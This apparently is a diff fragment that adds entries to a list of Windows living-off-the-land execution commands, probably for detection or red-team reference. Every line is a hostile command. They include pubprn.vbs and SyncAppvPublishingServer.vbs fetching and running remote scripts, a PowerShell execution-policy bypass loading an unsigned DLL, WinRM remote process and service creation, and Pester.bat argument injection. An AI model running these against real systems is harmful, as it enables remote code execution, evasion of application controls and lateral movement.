+pubprn.vbs 127.0.0.1 script:https://www.example.org/file.sct
+SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('https://www.example.org/file.ps1') | IEX"
+powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"
+winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd /c c:\windows\system32\calc.exe"} -r:http://target:5985
+winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="cmd /c c:\windows\system32\calc.exe"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985
+%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
+Pester.bat [/help|?|-?|/?] "$null; cmd /c c:\windows\system32\calc.exe"
+Pester.bat ;file.exe
